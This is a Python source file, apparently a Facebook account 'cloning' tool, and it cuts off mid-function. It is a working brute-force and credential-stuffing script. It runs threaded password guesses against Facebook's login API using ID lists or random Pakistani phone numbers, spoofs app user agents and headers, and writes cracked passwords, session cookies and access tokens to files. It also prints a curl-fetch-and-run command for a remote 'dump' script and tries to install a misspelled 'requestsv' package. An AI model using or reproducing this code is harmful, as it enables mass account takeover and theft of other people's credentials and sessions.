import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp


try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')

def p(x):
	print(x)

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
#SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBILE.LTE', 'MODERATE', 'Fiber', 'DSL', 'Satellite', 'Dial-up', 'Fixed Wireless', 'Cable', 'WiMAX'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = ("""
   
  8888888b. 88888888888 8888888 
  888   Y88b    888       888   
  888    888    888       888   
  888   d88P    888       888   
  8888888P"     888       888   
  888           888       888   
  888           888       888   
  888           888     8888888 
                                                                                                                              
---------------------------------------------------
  Github    : https://github.com/Meta
  Facebook  : https://www.facebook.com/Innocentumar
  Author    : M.UMAR
  Version   : Version [24.8]
-------------------------------------------------- 
""")  
	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string

#method1
yahe ="[FBAN/Orca-Android;FBAV/184.0.0.16.124;FBBV/269622440;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/217.0.0.16.270;FBBV/558731137;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/137.0.0.16.159;FBBV/843343288;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/238.0.0.16.290;FBBV/439452387;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/293.0.0.16.134;FBBV/133818033;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/119.0.0.16.120;FBBV/481851166;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/278.0.0.16.114;FBBV/726391812;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/228.0.0.16.220;FBBV/620771074;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/167.0.0.16.266;FBBV/696904144;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/181.0.0.16.207;FBBV/116263102;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/102.0.0.16.176;FBBV/593430818;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/255.0.0.16.237;FBBV/464780736;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/144.0.0.16.199;FBBV/313275193;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/266.0.0.16.283;FBBV/921416235;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/292.0.0.16.102;FBBV/135180365;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/139.0.0.17.85;FBBV/74871072;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1};FBLC/in_ID;FBCR/Telia;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.orca;FBDV/D6503;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBBV/182747450;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1};FBLC/es_ES;FBCR/Telia;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.orca;FBDV/Redmi Note 7;FBSV/9;nullFBCA/arm64-v8a:armeabi;]","[FBAN/Orca-Android;FBAV/393.0.0.18.92;FBBV/440593596;FBDM/{density=2.75,width=1080,height=2177};FB_FW/1};FBLC/es_ES;FBCR/Telia;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.orca;FBDV/2201117SY;FBSV/11;nullFBCA/arm64-v8a:armeabi;]","[FBAN/Orca-Android;FBAV/396.0.0.14.82;FBBV/446475560;FBDM/{density=2.0,width=720,height=1449};FB_FW/1};FBLC/cs_CZ;FBCR/Telia;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.orca;FBDV/M2006C3MNG;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/294.0.0.24.129;FBBV/263695251;FBDM/{density=1.5,width=480,height=888};FB_FW/1};FBLC/en_GB;FBCR/Telia;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.orca;FBDV/5003D_EEA;FBSV/8.1.0;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBBV/16048044;FBDM/{density=2.0,width=720,height=1184};FB_FW/1};FBLC/en_US;FBCR/Telia;FBMF/zte;FBBD/zte;FBPN/com.facebook.orca;FBDV/Z987;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBBV/182747440;FBDM/{density=2.0,width=1424,height=720};FB_FW/1};FBLC/th_TH;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH1909;FBSV/8.1.0;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/238.0.0.14.120;FBBV/179092826;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1};FBLC/th_TH;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.orca;FBDV/AGS2-L09;FBSV/8.0.0;nullFBCA/armeabi-v7a:armeabi;]"


def uaa():
    app_versions = [ '196.0.0.29.99', '200.0.0.30.105', '180.0.0.24.82',
        '210.0.0.35.120', '220.0.0.40.150', '230.0.0.45.180', 'YZWSES93', '4Q095MQG', 'A1XDL5U4']  # Add more000000 versions if needed
    locales = ['en_US', 'th_TH', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU',
        'pt_BR', 'zh_CN', 'ar_SA', 'hi_IN', 'tr_TR', 'nl_NL', 'id_ID', 'pl_PL', 'sv_SE',
        'no_NO', 'da_DK', 'fi_FI', 'hu_HU', 'cs_CZ', 'el_GR', 'he_IL', 'vi_VN', 'ro_RO',
        'bg_BG', 'hr_HR', 'sr_RS', 'sk_SK', 'sl_SI', 'et_EE', 'lv_LV', 'lt_LT', 'uk_UA']  # Add more locales if needed
    carriers = ['null', 'AIS', 'Verizon', 'Vodafone']  # Add more carriers if needed
    manufacturers = ['samsung', 'OPPO', 'TECNO', 'Realme', 'Sony', 'LG', 'Nokia', 'VIVO', 'Apple', 'Xiaomi', 'OnePlus', 'Motorola', 'Nokia', 'Lenovo', 'BlackBerry', 'Oppo', 'Vivo', 'Realme', 'OnePlus', 'HTC', 'ZTE', 'Meizu', 'Infinix', 'Tecno', 'Xolo', 'Micromax', 'Honor', 'Sharp', 'Lenovo', 'Panasonic', 'Asus', 'Lava', 'Gionee', 'HMD_Global', 'Honor', 'LeEco', 'Lenovo',
	'Micromax', 'Nubia', 'Oppo', 'Panasonic', 'Realme', 'Sharp', 'Sony', 'Vivo', 'Xiaomi', 'Motorola', 'Nokia', 'Blackberry', 'Google', 'HTC', 'LG', 'Lenovo', 'OnePlus', 'Realme', 'Sony', 'Vivo', 'ZTE', 'Alcatel', 'Amazon', 'Blackview', 'Blu', 'Cubot', 'Elephone', 'Gigaset', 'Hisense', 'Infinix', 'Karbonn', 'Kazam',
	'Kyocera', 'Lephone', 'Medion', 'Meizu', 'Micromax', 'Nextbit', 'Nubia', 'NuVision', 'Obi', 'Onida', 'Oppo', 'Palm', 'Parla', 'Poco', 'Razer', 'Realme', 'Sanyo', 'Spice', 'Tecno', 'Verykool', 'Vivo', 'Wiko', 'Xolo', 'YU', 'Zebra', 'ZTE', 'ZUK',
	'QMobile', 'Haier', 'Tecno', 'itel', 'Telenor', 'Nokia', 'Infinix', 'Motorola', 'OPhone', 'Rivo', 'VGO Tel', 'GFive', 'Megagate', 'Club Mobile', 'Voice Mobile', 'Calme', 'GFive', 'HTC', 'Honor', 'LG', 'Meizu', 'OnePlus', 'Oppo', 'Realme', 'Sony', 'Vivo', 'Xiaomi', 'ZTE']  # Add more manufacturers if needed
    android_versions = ['6.0.0' , '7.0.0', '8.0.0', '9.0.0', '10.0.0']  # Add more Android versions if needed
    cpu_architectures = ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64', 'armeabi']  # Add more CPU architectures if needed
    screen_densities = ['3.0', '2.0', '4.0', "1.5", '2.5', '3.0']  # Add more screen densities if needed

    user_agent = (
        f"FBAN/Orca-Android;FBAV/{random.choice(app_versions)};"
        f"FBPN/com.facebook.orca;FBLC/{random.choice(locales)};"
        f"FBBV/{random.randint(100000000, 999999999)};"
        f"FBCR/{random.choice(carriers)};FBMF/{random.choice(manufacturers)};"
        f"FBBD/{random.choice(manufacturers)};FBDV/{random.choice(['SM-A720F','SM-G5700', 'SM-G5510', 'SM-G5520', 'SM-G5528', 'SM-J710FN', 'SM-A826S', 'SM-N980BDS', 'SM-G970F', 'iPhone12,8', 'HTC_U11', 'Pixel_5', 'Redmi_Note_9','SM-N980BDS', 'SM-G970F', 'iPhone12,8', 'HTC_U11', 'Pixel_5', 'Redmi_Note_9', 'Galaxy_S21', 'OnePlus_9', 'Mi_11', 'Poco_F3', 'Xperia_1_III', 'Mate_40_Pro', 'Moto_G60', 'ZenFone_8', 'Vivo_X60_Pro', 'Nokia_X20', 'Pixel_6', 'Galaxy_S22', 'iPhone13,1', 'Redmi_10', 'Xperia_5_III', 'OnePlus_9T', 'Mi_11T_Pro', 'Realme_GT', 'Xiaomi_Mi_12', 'Oppo_F19', 'LG_G9', 'Sony_Xperia_10_IV', 'Nokia_9_3', 'OnePlus_10', 'Vivo_V21', 'Xiaomi_Mi_11X', 'Motorola_Moto_G100', 'HTC_Desire_21', 'Realme_X9', 'Nokia_X60', 'Samsung_Galaxy_A32', 'OnePlus_Nord_CE', 'Sony_Xperia_1_IV', 'Xiaomi_Mi_12T', 'Oppo_Reno_6', 'Motorola_Moto_E7', 'LG_Wing', 'HTC_U20', 'Realme_X7', 'Nokia_X70', 'Vivo_Y53s', 'Xiaomi_Mi_Mix_4', 'Samsung_Galaxy_F42', 'OnePlus_Nord_N10', 'Sony_Xperia_5_IV', 'Xiaomi_Mi_12S', 'Oppo_Reno_7', 'Motorola_Moto_G200', 'LG_Velvet', 'HTC_Drive_7', 'Realme_X8', 'Nokia_X80', 'Vivo_Y73s', 'Xiaomi_Mi_Mix_5', 'Samsung_Galaxy_A42', 'OnePlus_Nord_N100', 'Sony_Xperia_5A', 'Xiaomi_Mi_12R', 'Oppo_Reno_8', 'Motorola_Moto_G300', 'LG_Q6', 'HTC_Drive_8', 'Realme_X9 Pro', 'Nokia_X90', 'Vivo_Y93s', 'Xiaomi_Mi_Mix_6', 'Samsung_Galaxy_F52', 'OnePlus_Nord_N200', 'Sony_Xperia_5B', 'Xiaomi_Mi_12T Pro', 'Oppo_Reno_9', 'Motorola_Moto_G400', 'LG_Q7', 'HTC_Drive_9', 'Realme_X10', 'Nokia_X100', 'Vivo_Y95s', 'Xiaomi_Mi_Mix_7', 'Samsung_Galaxy_A52', 'OnePlus_Nord_N300', 'Sony_Xperia_5C', 'Xiaomi_Mi_12U', 'Oppo_Reno_10', 'Motorola_Moto_G500', 'LG_Q8', 'HTC_Drive_10', 'Realme_X11', 'Nokia_X110', 'Vivo_Y100s', 'Xiaomi_Mi_Mix_8', 'Samsung_Galaxy_F62', 'OnePlus_Nord_N400', 'Sony_Xperia_5D', 'Xiaomi_Mi_12V', 'Oppo_Reno_11', 'Motorola_Moto_G600', 'LG_Q9', 'HTC_Drive_11', 'Realme_X12', 'Nokia_X120', 'Vivo_Y110s', 'Xiaomi_Mi_Mix_9', 'Samsung_Galaxy_A62', 'OnePlus_Nord_N500', 'Sony_Xperia_5E', 'Xiaomi_Mi_12W', 'Oppo_Reno_12', 'Motorola_Moto_G700', 'LG_Q10', 'HTC_Drive_12', 'Realme_X13', 'Nokia_X130', 'Vivo_Y120s', 'Xiaomi_Mi_Mix_10', 'Samsung_Galaxy_F72', 'OnePlus_Nord_N600', 'Sony_Xperia_5F', 'Xiaomi_Mi_12X', 'Oppo_Reno_13', 'Motorola_Moto_G800', 'LG_Q11', 'HTC_Drive_13', 'Realme_X14', 'Nokia_X140', 'Vivo_Y130s', 'Xiaomi_Mi_Mix_11', 'Samsung_Galaxy_A72', 'OnePlus_Nord_N700', 'Sony_Xperia_5G', 'Xiaomi_Mi_12Y', 'Oppo_Reno_14', 'Motorola_Moto_G900', 'LG_Q12', 'HTC_Drive_14', 'Realme_X15', 'Nokia_X150', 'Vivo_Y140s', 'Xiaomi_Mi_Mix_12', 'Samsung_Galaxy_F82', 'OnePlus_Nord_N800', 'Sony_Xperia_5H', 'Xiaomi_Mi_12Z', 'Oppo_Reno_15', 'Motorola_Moto_G1000', 'LG_Q13', 'HTC_Drive_15', 'Realme_X16', 'Nokia_X160', 'Vivo_Y150s', 'Xiaomi_Mi_Mix_13', 'Samsung_Galaxy_A82', 'OnePlus_Nord_N900', 'Sony_Xperia_5I', 'Xiaomi_Mi_12ZA', 'Oppo_Reno_16', 'Motorola_Moto_G1100', 'LG_Q14', 'HTC_Drive_16', 'Realme_X17', 'Nokia_X170', 'Vivo_Y160s', 'Xiaomi_Mi_Mix_14', 'Samsung_Galaxy_F92', 'OnePlus_Nord_N1000', 'Sony_Xperia_5J', 'Xiaomi_Mi_12ZB', 'Oppo_Reno_17', 'Motorola_Moto_G1200', 'LG_Q15'])};"
        f"FBSV/{random.choice(android_versions)};FBCA/{random.choice(cpu_architectures)};"
        f"FBDM/{{density={random.choice(screen_densities)},width=1080,height=1920}};FB_FW/1;"
    )

    return user_agent


def baba():
    start = f'[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(111111,9999999)};'
    end = '[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/PCAT00;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;;]'
    ua = start + end
    return ua


nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		logo()
		
		
		p(" [1] File Cloning ")
		p(" [2] Random Clone")
		p(" [3] Dump Tool")
		p(" [4] Pass changer ")
		p(' [W] Join Whatsapp Group ')
		p(" [A] Admin Contact ")
		line()
		opt1 = input(" {√} Select An Option : ")
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":self.num_menu()
		elif opt1 == "4":automation().menu()
		elif opt1 == "3":Grep().links_only()
		elif opt1 == "W":os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
		elif opt1 == "A":os.system("xdg-open https://wa.me/+923021431324")
	  
	
	def dump_menu(self):
		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
		
	def file_menu(self):
		logo()
		p(" 📁 : Example /sdcard/PTI.txt")
		file = input(" 📁 : Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		logo()
		p(" [〽️] Method 1 [ ✅ ] ")
		p(" [〽️] Method 2  ")
		p(" [〽️] Method 3  ")
		p(" [〽️] Method 4  ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		elif m_opt =="4":
			 method.append('iiii')
			 self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] How Many Password Do You Want  ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords  ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p("  Total File Accounts : %s "%(str(len(id))))
		p("  Proces has been started ")
		print('  The process is running in the background')
		print('  Use Airplane Mode For Best Result')
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()
		p(" [•] Cloning Hasbeen Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()

	def num_menu(self):
		logo()
		pwx=[]
		p(" [•] Advanced Random Cloning Tool ")
		line()
		p(" [•] Example : 0300 , 0313 , 0324 , 0342 ")
		line()
		code = input(" [•] Put Sim Code : ")
		logo()
		p(" [•] Example : 1000, 2000 , 5000 Max ")
		max = 5000
		try:
			clone_limit = int(input(" [•] Put Clone Limit : "))
			if clone_limit =="":
				clone_limit = 1000
			elif clone_limit > max:
				p(" [•] Limit Should be Under 5000 ");sp(2);self.num_menu()
		except:
			clone_limit = 1000
		for n in range(clone_limit):
			_ = random.randint(1111111,9999999)
			id.append(str(_))
		logo()
		p(" [1] Auto Password \n [2] Choice Password ")
		line()
		pwx_=[]
		pw_select = input(" [•] Choose : ")
		if pw_select == "1":
			pwx_.append("i")
		elif pw_select == "2":
			pwx_.append('ii')
			max = 10
			try:
				p_limit = int(input(" [•] Put Password Limit : "))
				if p_limit =="":
					p_limit = 5
				elif p_limit > max:
					p(" [•] Limit Should be Under 1 - 10 ");sp(2);num_menu()
			except:
				p_limit = 5
			for n in range(p_limit):
				pwx.append(input(" [•] Put Password %s : "%(n+1)))
		else:
			pwx_.append("i")
		logo()
		
		p(" [•] Total Random Accounts : %s "%(str(len(id))))
		p(" [•] Dilute Brute Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = code+user
				if "i" in pwx_:
					pwx = [user,uid,"khan1122","khankhan","khan123","baloch","i love you","khan1234","khan12345"]
					saqi.submit(self.r_crack,uid,pwx)
				elif "ii" in pwx_:
					saqi.submit(self.r_crack,uid,pwx)
				else:
					saqi.submit(self.r_crack,uid,pwx)
		self.saved_results(ok,cp)
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [PTI] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': uaa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				#a = headers
				#print(a)

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r PTI %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "d29d67d37eca387482a8a5b740f84f62",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': 'FBAN/FB4A;FBAV/{c};FBBV/243660882;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/{b};FBOP/19;FBCA/arm64-v8a]'(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': 20326,
'X-FB-SIM-HNI': 39502,
'X-FB-Connection-Type': 'unknown',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': connection_token()}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[PTI-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/PTI_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/PTI_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
